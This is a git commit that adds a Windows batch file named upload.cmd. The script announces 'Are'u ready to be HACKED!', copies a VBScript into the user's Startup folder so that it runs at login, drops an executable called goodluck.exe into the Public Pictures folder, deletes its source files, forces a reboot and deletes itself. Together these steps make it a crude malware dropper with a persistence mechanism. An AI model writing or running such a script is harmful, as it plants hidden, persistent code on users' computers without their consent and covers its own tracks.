2ac11132711e3f561a3532efe701a1642c740a3a
daddydemir <42716195+daddydemir@users.noreply.github.com>
2021-11-15 14:31:49 +0300

    Create upload.cmd

---
+++ upload.cmd
@@ -0,0 +1,9 @@
+echo off
+color a
+echo "Are'u ready to be HACKED! "
+copy run.vbs "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy goodluck.exe "C:\Users\Public\Pictures"
+del rub.vbs
+del goodluck.exe
+shutdown /r
+del upload.cmd
